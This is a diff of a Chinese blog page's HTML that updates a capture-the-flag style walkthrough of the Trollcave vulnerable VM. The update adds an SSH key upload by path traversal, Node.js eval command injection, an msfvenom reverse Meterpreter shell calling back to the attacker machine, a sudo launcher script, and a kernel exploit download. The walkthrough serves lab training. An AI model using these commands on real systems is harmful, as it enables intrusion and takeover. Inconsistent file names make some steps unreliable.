@@ -318,7 +318,7 @@ Trollcave渗透测试案例：1.了解其功能主要功能：欢迎导语页面
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -477,14 +477,14 @@ Trollcave渗透测试案例：1.了解其功能主要功能：欢迎导语页面
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.1k
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    10 分
                 </div>
                 
                 
@@ -545,7 +545,7 @@ nmap -sS -O -P0 -n -A</code></pre><p>关于-P0：</p>
 <pre><code>ssh-keygen -C（为所创建的公钥做注释）rails@192.168.204.140</code></pre><p>②把public key上 传到靶机上：</p>
 <p>a.利用文件上传</p>
 <p>b.按公钥存储的路径（默认Default）上传公钥</p>
-<p>../../../../../../../../home/rails/.ssh/1_keys（上传的名字）</p>
+<p><strong>../../../../../../home/rails/.ssh/authorized_keys</strong>（上传的名字）注意这里的名字一定要是authorized_keys</p>
 <p>③在攻击机利用公钥去连接靶机上的用户</p>
 <pre><code>ssh rails@192.168.204.140 -i xxx（此处的名字要与你上传的xxx.pub文件名字相同，不然会连接不上！！！！）
 Last login: Thu Jul 11 03:57:36 2019 from 192.168.198.136
@@ -575,7 +575,9 @@ function calc(pathname, request, query, response)
 <p>eg：<a href="http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器" target="_blank" rel="noopener">http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器</a></p>
 <p>eg：<a href="http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)" target="_blank" rel="noopener">http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)</a></p>
 <p>这里会通过require（）在本地操作系统上启动一个子进程，然后通过上述子进程去执行（exec）whoami这个shell命令，然后将上述内容房子eval（）里面，结果就会在本地操作系统上真正执行whoami</p>
-<h3 id="6-代码漏洞验证"><a href="#6-代码漏洞验证" class="headerlink" title="6.代码漏洞验证"></a>6.代码漏洞验证</h3><p>1.验证8888端口服务是不是启动</p>
+<p>踩坑：如果calc.js文件因为操作失误不小心把内容干没了，就重置虚拟机</p>
+<h3 id="6-代码漏洞验证"><a href="#6-代码漏洞验证" class="headerlink" title="6.代码漏洞验证"></a>6.代码漏洞验证</h3><p>接下来使用虚拟机来模拟上述的在URL里面执行的操作</p>
+<p>1.验证8888端口服务是不是启动</p>
 <pre><code>netstat -antp
 列出当前主机上所有开放的端口
 |grep 8888
@@ -585,15 +587,15 @@ netstat -antp | grep 8888</code></pre><p><img src="http://images2.5666888.xyz//%
 <pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;whoani&#39;)&quot;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51941_7.png" alt></p>
 <p>如果命令执行且没有报错，说明可能存在shell上传漏洞，也就是说，有可以利用的反弹shell</p>
 <h3 id="7-生成并上传shell"><a href="#7-生成并上传shell" class="headerlink" title="7.生成并上传shell"></a>7.生成并上传shell</h3><p>这里不会得到命令的输出，而是返回了[object Object]，由此猜测sum参数里的whoami这个命令被执行了，因此可以利用这里触发一个shell。</p>
-<p>1.使用msfvenom创建shell：</p>
+<p><strong>1.使用msfvenom创建shell：</strong></p>
 <p>msfvenom -p linux/x64/meterpreter_reverse_tcp  → 设置payload</p>
 <p>-f elf  →  生成格式</p>
 <p>-o shell → 生成路径（输出文件名字）</p>
 <p>LHOST=192.168.110.6   →    Kali地址</p>
 <p>LPORT=6666      →    反弹端口</p>
 <p>先启动msfconsole,之后输入如下命令：</p>
-<pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell1 -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.利用文件漏洞上传shell</p>
-<p>路径：/tmp/shell</p>
+<pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o demo -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.利用文件漏洞上传shell</p>
+<p>路径：/tmp/demo</p>
 <p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A52034_8.png" alt></p>
 <p>可以看出上传文件成功</p>
 <p>3.反弹shell</p>
@@ -601,10 +603,12 @@ netstat -antp | grep 8888</code></pre><p><img src="http://images2.5666888.xyz//%
 msf exploit(handler) &gt; set payload linux/x64/meterpreter_reverse_tcp
 msf exploit(handler) &gt; set LHOST 192.168.110.6
 msf exploit(handler) &gt; set LPORT 6666
-msf exploit(handler) &gt; run -j</code></pre><p>发现因为权限问题shell无法反弹</p>
-<p>4.编写启动shell的脚本</p>
+msf exploit(handler) &gt; run -j</code></pre><pre><code>cd /tmp
+./yshell</code></pre><p>发现因为权限问题yshell无法反弹</p>
+<p>4.编写启动shell的脚本(在tmp目录下)</p>
 <p>因为rails用户没有上传执行shell的权限</p>
-<pre><code>#!/bin/bash
+<pre><code>vim run.sh
+#!/bin/bash
 sudo cp /tmp/shell1 /home/king/shell1
 sudo chown king:king /home/king/shell1(chown： 修改所属用户与组。将shell1拥有者与群组改为king)
 sudo chmod a+x /home/king/shell1
@@ -646,10 +650,27 @@ sudo /home/king/shell1</code></pre><p>对chmod命令的回顾：</p>
 <pre><code>#  chmod  a-x test1
 # ls -al test1
 -rw-r--r-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>5.运行脚本</p>
-<p>因为tmp目录下的calc</p>
+<pre><code>./run.sh</code></pre><p>但是因为权限不够，脚本无法运行</p>
+<p>因为/home/king目录下的calc</p>
 <pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/run.sh&#39;)&quot;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8829%E6%97%A51902_1.png" alt></p>
 <p>然后没有反弹shell</p>
-<p>有待更新！！！</p>
+<p>查看了一下king目录下，并没有yshell，也就是说脚本没有运行</p>
+<pre><code>chmod a+x run.js#赋予可执行权限</code></pre><p>然后再curl成功反弹shell</p>
+<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8802%E6%97%A50052_1.png" alt></p>
+<h2 id="另一种方法（针对ubantu的版本漏洞进行提权）："><a href="#另一种方法（针对ubantu的版本漏洞进行提权）：" class="headerlink" title="另一种方法（针对ubantu的版本漏洞进行提权）："></a>另一种方法（针对ubantu的版本漏洞进行提权）：</h2><h3 id="1-ssh创建好shell"><a href="#1-ssh创建好shell" class="headerlink" title="1.ssh创建好shell"></a>1.ssh创建好shell</h3><p>uname -a得：<br>Linux trollcave 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p><strong>cat /proc/versio</strong>n得：</p>
+<p>Linux version 4.4.0-197-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020</p>
+<p>2.得知ubantu和linux版本信息</p>
+<p>懂<del>~</del></p>
+<pre><code>searchsploit 4.4.0-197</code></pre><p> Exploits: No Result<br>Shellcodes: No Result</p>
+<p>是在下不配了</p>
+<p>百度<a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 本地提权漏洞复测过程</a></p>
+<pre><code>rails@trollcave:/proc/sys/kernel$ cat unprivileged_bpf_disabled 
+0</code></pre><p><em><em>1，下载poc文件 upstream44.c<br>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a>
+</em></em></p>
+<p>下载物理机上传kali上面就行</p>
+<pre><code>root@kali1:~/桌面/trollcave# gcc -o upstream upstream44.c</code></pre><p>复制，利用网站的文件上传漏洞传到/tmp/.Test-unix/666并赋予可执行命令，结果出问题了</p>
 
             </div>
             <hr />
@@ -1143,7 +1164,7 @@ sudo /home/king/shell1</code></pre><p>对chmod命令的回顾：</p>
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Trollcave渗透测试">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Trollcave渗透测试">
                         
                         <span class="card-title">Trollcave渗透测试</span>
                     </div>
@@ -1200,7 +1221,7 @@ Trollcave渗透测试案例：1.了解其功能主要功能：欢迎导语页面
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/32.jpg" class="responsive-img" alt="Lazysysadmin渗透初探">
+                        <img src="/medias/featureimages/36.jpg" class="responsive-img" alt="Lazysysadmin渗透初探">
                         
                         <span class="card-title">Lazysysadmin渗透初探</span>
                     </div>
@@ -1410,7 +1431,7 @@ nmap -sP 127.0.0.0/24根据mac地址00:0C:29:E3:72:7
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">28.8k</span>
+            <span class="white-color">29.1k</span>
             
 
             <br>
